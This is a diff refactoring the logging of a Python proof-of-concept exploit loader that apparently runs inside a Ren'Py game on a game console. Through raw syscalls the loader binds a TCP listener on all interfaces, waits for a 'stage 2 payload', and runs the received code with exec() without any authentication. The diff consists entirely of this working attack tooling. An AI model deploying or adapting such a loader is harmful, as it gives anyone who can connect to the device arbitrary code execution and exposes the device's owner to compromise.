@@ -1,12 +1,10 @@
-import renpy
 import struct
 import traceback
 from structure import Structure
-from utils.renpy import print, print_exc
+from utils.etc import bytes
+from utils.rp import log, log_exc
 from utils.conversion import u64_to_i64
-from constants import (
-    CONSOLE_KIND,
-)
+from constants import CONSOLE_KIND, rp
 from errors.socket import SocketError
 from sc import sc
 
@@ -63,7 +61,7 @@ def create_tcp_socket(sc):
     sockaddr_in.sin_addr = struct.unpack("<I", struct.pack(">I", 0))[0]  # INADDR_ANY
 
     s = u64_to_i64(sc.syscalls.socket(AF_INET, SOCK_STREAM))
-    print("[*] Created TCP socket: %d" % s)
+    log("[*] Created TCP socket: %d" % s)
     if s < 0:
         raise SocketError(
             "socket failed with return value %d, error %d\n%s"
@@ -77,10 +75,10 @@ def create_tcp_socket(sc):
         enable_buf,
         4,
     )
-    print("[*] Set socket options: %d" % s)
+    log("[*] Set socket options: %d" % s)
 
     bind = u64_to_i64(sc.syscalls.bind(s, sockaddr_in, 16))
-    print("[*] Bound socket: %d" % bind)
+    log("[*] Bound socket: %d" % bind)
     if bind != 0:
         raise SocketError(
             "bind failed with return value %d, error %d\n%s"
@@ -93,16 +91,13 @@ def create_tcp_socket(sc):
             "listen failed with return value %d, error %d\n%s"
             % (listen, sc.errno, sc.get_error_string())
         )
-    print("[*] Listening on socket: %d" % s)
+    log("[*] Listening on socket: %d" % s)
 
     return s, sockaddr_in
 
 
 def poc():
-    print(
-        "[*] Detected console kind: %s, game name: %s"
-        % (CONSOLE_KIND, renpy.config.name)
-    )
+    log("[*] Detected console kind: %s, game name: %s" % (CONSOLE_KIND, rp.config.name))
 
     s = None
     port = None
@@ -111,7 +106,7 @@ def poc():
             ("len", 4),
         ]
     ).create()
-    print("[*] Creating TCP socket...")
+    log("[*] Creating TCP socket...")
     s, sockaddr_in = create_tcp_socket(sc)
 
     sc.syscalls.getsockname(
@@ -128,7 +123,7 @@ def poc():
     else:
         sc.send_notification("Listening on %s:%d for stage 2 payload..." % (ip, port))
     while True:
-        print("Waiting for client connection...")
+        log("Waiting for client connection...")
         client_sock = u64_to_i64(
             sc.syscalls.accept(
                 s,
@@ -146,7 +141,7 @@ def poc():
                 )
             )
 
-        print("Client connected on socket %d" % client_sock)
+        log("Client connected on socket %d" % client_sock)
 
         read_size = -1
         stage2_str = ""
@@ -169,18 +164,18 @@ def poc():
                     )
                 )
 
-        print("Received payload, executing...")
+        log("Received payload, executing...")
 
         sc.syscalls.close(client_sock)  # close client socket
 
         # Execute code, mimic file-exec by throwing local/global in same scope
-        global_scope = dict(globals(), **locals())
+        scope = dict(globals(), **locals())
         try:
-            exec(stage2_str, global_scope)
-            print("Payload executed successfully")
+            exec(stage2_str, scope)
+            log("Payload executed successfully")
         except Exception as e:
             exc_msg = traceback.format_exc()
-            print_exc(exc_msg)
+            log_exc(exc_msg)
 
     sc.syscalls.close(s)  # close listening socket
 
